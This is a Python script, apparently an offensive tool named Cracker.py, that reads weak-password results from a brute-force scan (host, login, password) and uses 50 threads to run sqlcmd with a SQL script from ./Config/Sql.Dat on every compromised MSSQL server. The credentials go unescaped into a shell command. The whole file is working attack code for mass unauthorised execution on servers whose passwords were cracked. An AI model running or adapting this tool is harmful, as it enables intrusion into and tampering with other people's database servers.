#codin:utf-8
"""
date:2020-1-17
program:Cracker.py
author:Hui
Operating platform: Linux
"""
import threading
import time
import sys
import os
import logging
import subprocess

class Execute:

    def __init__(self):
        self.threading_num = 50 #线程数
        self.HostS = [] # 主机暂存
        self.Path = os.getcwd() # 获取运行目录
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger("Execute")

    def readHost(self):
        with open("results.txt","r") as f:
            for line in f:
                Host = line.split("   ")[0].split("host: ")[1] # IP地址
                User = line.split("   ")[1].split("login: ")[1] # 用户名
                try:
                    Pass = line.split("password: ")[1].strip("\n")  # 密码
                except :
                    User = line.split("   ")[1].split("login: ")[1].strip("\n")  # 用户名
                    Pass = ""
                self.HostS.append([Host,User,Pass])

    def executeSql(self,Host,User,Pass): #调用SqlCmd执行sql脚本

        if Pass == "": Pass = "\"\""  #密码等于空加上双引号
        try:
            self.logger.info(u'正在连接  {}'.format(Host))
            self.logger.info(subprocess.call("sqlcmd -S {0} -U {1} -P {2} -i \"./Config/Sql.Dat\"".format(Host, User, Pass), shell=True,cwd=self.Path))
        except Exception as e:
            logging.error(e.args)
            logging.error(u'{}  连接失败 ！'.format(Host))
            return False

    def threadings(self):
        while True:
            if len(self.HostS)>= self.threading_num: # 判断剩余主机是否大于线程数
                list = []
                for i in range(self.threading_num):
                    Hosts = self.HostS.pop()
                    Host, User, Pass = Hosts[0], Hosts[1], Hosts[2]
                    list.append(threading.Thread(target=self.executeSql, args=(Host,User,Pass)))
                    list[i].start()
                time.sleep(60)
            elif len(self.HostS)<self.threading_num and len(self.HostS)!=0: # 判断剩余主机是否小于线程数
                list = []
                for i in range(len(self.HostS)):
                    List = self.HostS.pop()
                    Host, User, Pass = List[0], List[1], List[2]
                    list.append(threading.Thread(target=self.executeSql, args=(Host,User,Pass)))
                    list[i].start()
                time.sleep(60)
            elif len(self.HostS) == 0:
                sys.exit()

    def run(self):
        self.readHost() # 读取弱口令文件
        self.threadings() # 启动线程执行

if __name__ == '__main__':
    E = Execute() # 实例化
    E.run()  # 启动